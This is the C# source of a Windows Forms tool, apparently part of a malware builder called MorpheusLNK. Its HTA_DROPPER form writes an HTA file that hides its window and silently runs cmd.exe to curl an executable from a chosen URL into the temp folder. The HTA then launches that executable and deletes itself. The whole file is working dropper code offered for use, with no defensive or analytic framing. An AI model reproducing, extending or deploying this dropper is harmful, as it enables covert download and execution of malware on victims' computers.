using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MorpheusLNK
{
    public partial class HTA_DROPPER : Form
    {

        public HTA_DROPPER()
        {
            InitializeComponent();
        }
        private void HtaBuild_btn_Click(object sender, EventArgs e)
        {
            string url = downloadUrl_Box.Text;
            string exeName = afterExe_Name.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(exeName))
            {
                SetStatusLabel("Status: Error form cannot be empty!", Color.Red);
                return;
            }

            try
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = "HTA files|*.hta";
                saveFileDialog1.Title = "Save HTA File";
                saveFileDialog1.ShowDialog();

                if (saveFileDialog1.FileName != "")
                {
                    string filePath = saveFileDialog1.FileName;
                    string htaContent = GenerateHTAScript(url, exeName);
                    File.WriteAllText(filePath, htaContent);
                    SetStatusLabel("HTA script created successfully!", Color.Green);
                }
                else
                {
                    SetStatusLabel("Status: HTA script build failed!", Color.Red);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex}");
            }
        }

        private string GenerateHTAScript(string url, string exeName)
        {
            string cmdCommand = $"/c mode 15,1 & curl {url} -o %temp%\\{exeName} & start /b %temp%\\{exeName}";
            string htaScript = $@"
<html>
<head>
<HTA:APPLICATION ID=""oHTA""
     APPLICATIONNAME=""Windows""
     BORDER=""none""
     CAPTION=""no""
     SHOWINTASKBAR=""no""
     SINGLEINSTANCE=""yes""
     SYSMENU=""no""
     SCROLL=""no""
     WINDOWSTATE=""minimize"">
<script language=""VBScript"">



Set objShell = CreateObject(""WScript.Shell"")
command = ""cmd.exe {cmdCommand}""
objShell.Run command, 0, True
Set objFSO = CreateObject(""Scripting.FileSystemObject"")
strScriptPath = objFSO.GetAbsolutePathName(Replace(document.location.pathname, ""/"", ""\""))
objFSO.DeleteFile strScriptPath
window.close



</script>
</head>
<body>
</body>
</html>";
            return htaScript;
        }

        private async void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = text;
            await Task.Delay(3000);
            statusLabel.Text = "";
        }
    }
}
